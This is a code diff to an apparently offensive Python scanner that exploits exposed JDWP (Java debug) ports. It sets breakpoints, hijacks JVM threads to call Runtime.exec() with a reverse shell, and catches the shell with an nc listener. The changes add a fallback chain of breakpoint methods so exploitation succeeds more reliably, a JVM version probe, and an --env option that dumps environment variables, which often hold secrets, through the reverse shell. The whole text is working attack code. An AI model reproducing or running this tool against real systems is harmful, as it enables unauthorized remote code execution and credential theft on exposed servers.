@@ -27,7 +27,7 @@ Requirements:
   - Python 3.8+ (zero pip dependencies)
   - netcat (nc) for catching reverse shells during RCE checks
 
-RCE engine based on jdwp-shellifier by @_hugsy_ (IOActive) ... Love Goes Out <3
+RCE engine based on jdwp-shellifier by @_hugsy_ (IOActive)
 https://github.com/IOActive/jdwp-shellifier
 
 Author: ChiZu (https://github.com/G0ldSec)
@@ -96,7 +96,7 @@ class Stats:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  JDWP Protocol Engine (ported from jdwp-shellifier by @_hugsy_ to python3 by @CHiZu ... Sending Love <3) 
+#  JDWP Protocol Engine (ported from jdwp-shellifier by @_hugsy_)
 # ═══════════════════════════════════════════════════════════════════
 
 # JDWP protocol constants
@@ -487,25 +487,30 @@ class JDWPClient:
 #  RCE Engine — Runtime.exec() via JDWP breakpoint hijack
 # ═══════════════════════════════════════════════════════════════════
 
-def jdwp_exec_command(
+# Breakpoint methods to try, in order of likelihood to trigger.
+# Different apps call different methods — idle JVMs won't hit String.valueOf
+# but almost everything hits Thread.sleep or ClassLoader at some point.
+DEFAULT_BREAKPOINT_CHAIN = [
+    "java.lang.String.valueOf",
+    "java.net.ServerSocket.accept",
+    "java.lang.Thread.sleep",
+    "java.lang.ClassLoader.loadClass",
+    "java.net.Socket.connect",
+]
+
+
+def _try_single_breakpoint(
     host: str,
     port: int,
     command: str,
-    break_on: str = "java.lang.String.valueOf",
-    timeout: int = 10,
-    log=None,
+    break_on: str,
+    timeout: int,
+    log,
 ) -> tuple[bool, str]:
     """
-    Execute a command on a remote JVM via JDWP Runtime.exec().
-
-    Sets a breakpoint on a frequently called method, waits for it
-    to fire, then hijacks the thread to call Runtime.getRuntime().exec().
-
-    Returns: (success: bool, details: str)
+    Single breakpoint attempt. Connects, sets one breakpoint, waits.
+    Returns: (success, details). On breakpoint timeout returns (False, "TIMEOUT").
     """
-    log = log or (lambda msg: None)
-
-    # Parse break-on class and method
     dot_idx = break_on.rfind(".")
     if dot_idx == -1:
         return False, "Invalid break-on format"
@@ -515,7 +520,6 @@ def jdwp_exec_command(
     cli = JDWPClient(host, port, timeout=timeout)
 
     try:
-        log(f"        Connecting JDWP client...")
         cli.start()
         log(f"        JVM: {cli.version}")
 
@@ -523,24 +527,22 @@ def jdwp_exec_command(
         runtime_class = cli.get_class_by_name("Ljava/lang/Runtime;")
         if runtime_class is None:
             return False, "Cannot find java.lang.Runtime"
-        log(f"        Found Runtime class: id={runtime_class['refTypeId']:#x}")
 
         # 2. Find getRuntime() method
         cli.get_methods(runtime_class["refTypeId"])
         get_runtime_meth = cli.get_method_by_name("getRuntime")
         if get_runtime_meth is None:
             return False, "Cannot find Runtime.getRuntime()"
-        log(f"        Found Runtime.getRuntime(): id={get_runtime_meth['methodId']:#x}")
 
-        # 3. Set breakpoint on frequently called method
+        # 3. Set breakpoint
         bp_class = cli.get_class_by_name(break_class)
         if bp_class is None:
-            return False, f"Cannot find breakpoint class: {break_on}"
+            return False, f"Class not found: {break_on}"
 
         cli.get_methods(bp_class["refTypeId"])
         bp_method = cli.get_method_by_name(break_method)
         if bp_method is None:
-            return False, f"Cannot find breakpoint method: {break_on}"
+            return False, f"Method not found: {break_on}"
 
         loc = bytes([TYPE_CLASS])
         loc += cli.format_value(cli.referenceTypeIDSize, bp_class["refTypeId"])
@@ -548,13 +550,12 @@ def jdwp_exec_command(
         loc += struct.pack(">II", 0, 0)
 
         event_id = cli.send_event(EVENT_BREAKPOINT, (MODKIND_LOCATIONONLY, loc))
-        log(f"        Breakpoint set: event_id={event_id:#x}")
+        log(f"        Breakpoint set on {break_on} (id={event_id:#x})")
 
         # 4. Resume VM and wait for breakpoint
         cli.resumevm()
-        log(f"        Waiting for breakpoint on {break_on}...")
+        log(f"        Waiting for breakpoint...")
 
-        # Wait with timeout
         cli.socket.settimeout(timeout)
         thread_id = None
         try:
@@ -565,20 +566,25 @@ def jdwp_exec_command(
                     _, thread_id = ret
                     break
         except socket.timeout:
-            return False, f"Breakpoint timeout ({timeout}s) — method may not be called"
+            # Clean up breakpoint before disconnecting
+            try:
+                cli.clear_event(EVENT_BREAKPOINT, event_id)
+                cli.resumevm()
+            except Exception:
+                pass
+            return False, "TIMEOUT"
 
-        log(f"        Breakpoint hit! thread={thread_id:#x}")
+        log(f"        {C.GREEN}Breakpoint hit! thread={thread_id:#x}{C.NC}")
         cli.clear_event(EVENT_BREAKPOINT, event_id)
 
         # 5. Execute command via Runtime.exec()
-        log(f"        Executing: {command}")
+        log(f"        Executing command...")
 
         cmd_obj_ids = cli.createstring(command)
         if not cmd_obj_ids:
             return False, "Failed to allocate command string"
         cmd_obj_id = cmd_obj_ids[0]["objId"]
 
-        # Get Runtime instance
         buf = cli.invokestatic(
             runtime_class["refTypeId"],
             thread_id,
@@ -591,14 +597,10 @@ def jdwp_exec_command(
         if not rt:
             return False, "Runtime.getRuntime() returned null"
 
-        log(f"        Runtime context: id={rt:#x}")
-
-        # Find exec(String) method
         exec_meth = cli.get_method_by_name("exec")
         if exec_meth is None:
             return False, "Cannot find Runtime.exec()"
 
-        # Call exec()
         data = bytes([TAG_OBJECT]) + cli.format_value(cli.objectIDSize, cmd_obj_id)
         buf = cli.invoke(
             rt, thread_id,
@@ -620,6 +622,68 @@ def jdwp_exec_command(
         return False, f"Unexpected error: {e}"
     finally:
         cli.disconnect()
+
+
+def jdwp_exec_command(
+    host: str,
+    port: int,
+    command: str,
+    break_on: str = "java.lang.String.valueOf",
+    timeout: int = 10,
+    log=None,
+) -> tuple[bool, str]:
+    """
+    Execute a command on a remote JVM via JDWP Runtime.exec().
+
+    Tries the specified breakpoint method first. On timeout, automatically
+    falls back through a chain of common methods until one triggers.
+
+    Returns: (success: bool, details: str)
+    """
+    log = log or (lambda msg: None)
+
+    # Build method chain: user-specified first, then defaults (skip duplicates)
+    methods = [break_on]
+    for m in DEFAULT_BREAKPOINT_CHAIN:
+        if m != break_on:
+            methods.append(m)
+
+    last_error = ""
+    for i, method in enumerate(methods):
+        if i == 0:
+            log(f"        Connecting JDWP client...")
+        else:
+            log(f"        {C.YELLOW}Fallback → {method}{C.NC}")
+            # Give the JDWP port a moment to recover after disconnect
+            time.sleep(2)
+
+        success, details = _try_single_breakpoint(
+            host, port, command, method, timeout, log,
+        )
+
+        if success:
+            return True, details
+
+        if details == "TIMEOUT":
+            last_error = f"All breakpoint methods timed out ({timeout}s each)"
+            continue  # try next method
+
+        # Connection errors are retryable (port busy after previous disconnect)
+        if "connection" in details.lower():
+            log(f"        {C.YELLOW}{details} — retrying next method{C.NC}")
+            last_error = details
+            continue
+
+        # Class/method not found — skip to next
+        if "not found" in details.lower():
+            log(f"        {C.YELLOW}{details} — skipping{C.NC}")
+            last_error = details
+            continue
+
+        # Real failure (protocol error, exec failed, etc.)
+        return False, details
+
+    return False, last_error
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -686,6 +750,20 @@ def check_jdwp_handshake(ip: str, port: int, timeout: int = 5) -> bool:
         return False
 
 
+def probe_jdwp_version(ip: str, port: int, timeout: int = 5) -> Optional[str]:
+    """Connect via JDWP and grab the JVM version string. Returns None on failure."""
+    cli = JDWPClient(ip, port, timeout=timeout)
+    try:
+        cli.connect()
+        cli._idsizes()
+        cli._getversion()
+        return cli.version
+    except (JDWPError, socket.error, OSError, Exception):
+        return None
+    finally:
+        cli.disconnect()
+
+
 def detect_callback_ip(target_ip: str) -> Optional[str]:
     """Auto-detect the local IP used to route to the target network."""
     try:
@@ -704,6 +782,7 @@ def attempt_rce(
     rce_timeout: int = 15,
     shell_wait: int = 5,
     break_on: str = "java.lang.String.valueOf",
+    dump_env: bool = False,
     logger=None,
 ) -> tuple[bool, str, str]:
     """
@@ -713,6 +792,7 @@ def attempt_rce(
     2. Connect via JDWP, set breakpoint, hijack thread
     3. Execute Runtime.exec() with base64-encoded reverse shell
     4. Check listener for incoming connection
+    5. (optional) Dump environment variables via --env
 
     Returns: (success: bool, proof_type: str, details: str)
     """
@@ -732,8 +812,22 @@ def attempt_rce(
     except FileNotFoundError:
         pass
 
+    # Commands to pipe through the reverse shell.
+    # We write commands to a temp file (one per line) and cat it into nc.
+    # This avoids shell escaping issues with echo/printf in interactive bash.
+    # The trailing sleep keeps nc stdin open long enough for all output
+    # to arrive before the connection closes.
+    cmds = ["id", "hostname", "whoami", "echo JDWP_RCE_CONFIRMED"]
+    if dump_env:
+        cmds += ["echo ENV_START", "env", "echo ENV_END"]
+    cmds.append("exit")
+
+    cmd_file = f"/tmp/jdwp_cmds_{target.ip}_{target.port}.txt"
+    Path(cmd_file).write_text("\n".join(cmds) + "\n")
+
+    hold_time = shell_wait + 3
     listener_cmd = (
-        f'echo "id && hostname && whoami && echo JDWP_RCE_CONFIRMED && exit" | '
+        f"{{ cat {cmd_file}; sleep {hold_time}; }} | "
         f"nc -nlvp {callback_port} 2>&1"
     )
     listener_timeout = rce_timeout + shell_wait + 10
@@ -762,9 +856,10 @@ def attempt_rce(
     else:
         log(f"        {C.YELLOW}Exploit: {details}{C.NC}")
 
-    # Wait for possible callback
-    log(f"        Waiting {shell_wait}s for reverse shell...")
-    time.sleep(shell_wait)
+    # Wait for possible callback (extra time for env dump)
+    actual_wait = shell_wait + 3 if dump_env else shell_wait
+    log(f"        Waiting {actual_wait}s for reverse shell{' + env dump' if dump_env else ''}...")
+    time.sleep(actual_wait)
 
     # Stop listener and read results
     _cleanup_listener(listener_proc, callback_log=None)
@@ -775,10 +870,11 @@ def attempt_rce(
     except FileNotFoundError:
         pass
 
-    try:
-        os.remove(callback_log)
-    except FileNotFoundError:
-        pass
+    for tmp in (callback_log, cmd_file):
+        try:
+            os.remove(tmp)
+        except FileNotFoundError:
+            pass
 
     # Evaluate callback
     if "JDWP_RCE_CONFIRMED" in callback_data:
@@ -865,6 +961,8 @@ def run_scan(args: argparse.Namespace):
         log(f"  Callback   : {callback_ip}:{args.callback_port}")
         log(f"  Timeout    : {args.timeout}s per target")
         log(f"  Break-on   : {args.break_on}")
+        if args.env:
+            log(f"  Env dump   : enabled")
     else:
         log(f"  Mode       : Handshake-only (no RCE attempts)")
     log(f"{'=' * 70}")
@@ -872,13 +970,10 @@ def run_scan(args: argparse.Namespace):
 
     # Main loop
     for i, target in enumerate(targets, 1):
-        log(f"{'─' * 70}")
-        log(f"{C.BOLD}[{i}/{stats.total}] {target.ip}:{target.port}{C.NC}  "
-            f"({target.hostname}, Java {target.java_version})")
-        log(f"{'─' * 70}")
-
         # Step 1: Port check
         step_count = "2" if args.handshake_only else "3"
+        log(f"{'─' * 70}")
+        log(f"  {C.BOLD}[{i}/{stats.total}] {target.ip}:{target.port}{C.NC}")
         log(f"  [1/{step_count}] Port check...")
         if not check_port(target.ip, target.port, timeout=args.connect_timeout):
             log(f"  {C.RED}✗ Port closed{C.NC}")
@@ -894,6 +989,19 @@ def run_scan(args: argparse.Namespace):
         if check_jdwp_handshake(target.ip, target.port, timeout=args.connect_timeout):
             log(f"  {C.GREEN}✓ JDWP handshake confirmed{C.NC}")
             stats.handshake_ok += 1
+
+            # Probe JVM version if not already known from target file
+            if target.java_version == "unknown":
+                time.sleep(1)  # let JDWP port recover after handshake check
+                jvm_ver = probe_jdwp_version(target.ip, target.port, timeout=args.connect_timeout)
+                if jvm_ver:
+                    target.java_version = jvm_ver
+
+            # Print target info after version is known
+            host_info = target.hostname if target.hostname != "N/A" else target.ip
+            log(f"  {C.GREEN}✓ JVM: {target.java_version}{C.NC}")
+            log(f"  Host: {host_info}")
+
             stats.handshake_hosts.append(target)
         else:
             log(f"  {C.YELLOW}⚠ No handshake (busy/not JDWP){C.NC}")
@@ -915,6 +1023,7 @@ def run_scan(args: argparse.Namespace):
             rce_timeout=args.timeout,
             shell_wait=args.shell_wait,
             break_on=args.break_on,
+            dump_env=args.env,
             logger=log,
         )
 
@@ -923,11 +1032,32 @@ def run_scan(args: argparse.Namespace):
             log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
             log(f"  {C.RED}{C.BOLD}  RCE CONFIRMED — Proof: {proof}{C.NC}")
             log(f"  {C.RED}{C.BOLD}{'=' * 46}{C.NC}")
-            if details:
-                for line in details.splitlines():
+
+            # Split env dump from RCE proof output
+            env_block = ""
+            proof_lines = details or ""
+            if "ENV_START" in proof_lines and "ENV_END" in proof_lines:
+                parts = proof_lines.split("ENV_START", 1)
+                proof_lines = parts[0]
+                env_part = parts[1].split("ENV_END", 1)[0]
+                env_block = env_part.strip()
+
+            if proof_lines:
+                for line in proof_lines.splitlines():
                     line = line.strip()
                     if line and not re.match(r"^(nc:|listening)", line, re.I):
                         log(f"        {C.RED}{line}{C.NC}")
+
+            if env_block:
+                log("")
+                log(f"  {C.BOLD}  Environment Variables:{C.NC}")
+                log(f"  {'─' * 44}")
+                for line in sorted(env_block.splitlines()):
+                    line = line.strip()
+                    if line and "=" in line:
+                        log(f"        {line}")
+                log(f"  {'─' * 44}")
+
             stats.rce_ok += 1
             stats.rce_hosts.append((target, proof))
         else:
@@ -1028,7 +1158,9 @@ def main():
     )
     parser.add_argument(
         "--break-on", default="java.lang.String.valueOf",
-        help="Java method to set breakpoint on (default: java.lang.String.valueOf)",
+        help="Java method to try first for breakpoint (default: java.lang.String.valueOf). "
+             "On timeout, automatically falls back through: String.valueOf → ServerSocket.accept "
+             "→ Thread.sleep → ClassLoader.loadClass → Socket.connect",
     )
     parser.add_argument(
         "--timeout", type=int, default=15,
@@ -1045,6 +1177,10 @@ def main():
     parser.add_argument(
         "--pause", type=int, default=5,
         help="Pause between targets in seconds (default: 5)",
+    )
+    parser.add_argument(
+        "--env", action="store_true",
+        help="Dump environment variables after successful RCE",
     )
     parser.add_argument(
         "--handshake-only", action="store_true",
